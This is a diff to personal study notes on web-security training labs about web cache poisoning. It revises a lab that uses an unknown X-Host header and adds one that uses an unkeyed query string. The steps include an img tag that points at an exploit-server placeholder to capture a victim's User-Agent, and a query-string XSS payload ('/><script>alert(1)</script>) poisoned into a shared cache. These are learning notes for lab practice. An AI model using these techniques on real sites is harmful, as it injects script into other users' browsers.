@@ -33,9 +33,19 @@
 #4 Lab: Targeted web cache poisoning using an unknown header
 
     1. Send / to repeater and check for headers using paraminer
-    2. Got new header X-Host and paste exploit server url in it and send the request
+    2. Got new header X-Host and paste exploit server url in it and send the request and modify exploit server as done in previous labs.
     3. In response we can see it's showing missing user agent
     4. Do any comment <img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" /> and see the activity logs of exploit server
     5. Copy User-agent from there and paste in request and send the request
 
 -----------------------------------------------------------------------------------------------
+
+#5 Lab: Web cache poisoning via an unkeyed query string
+
+    1. Try cachebuster in difft headers like cookie,origin,accept etc...
+    2. Add Origin: https://cachebuster-hdakhfj and send the request 
+    3. Then after / add ?cb=cachebuster-hdakhfj'/><script>alert(1)</script> and send the request
+    4. Remove cb from origin and merge with accept header and send the request
+    5. Keep refreshing the page until cache gets hit and you will see the alert in victim's browser
+
+---------------------------------------------------------------------------------------
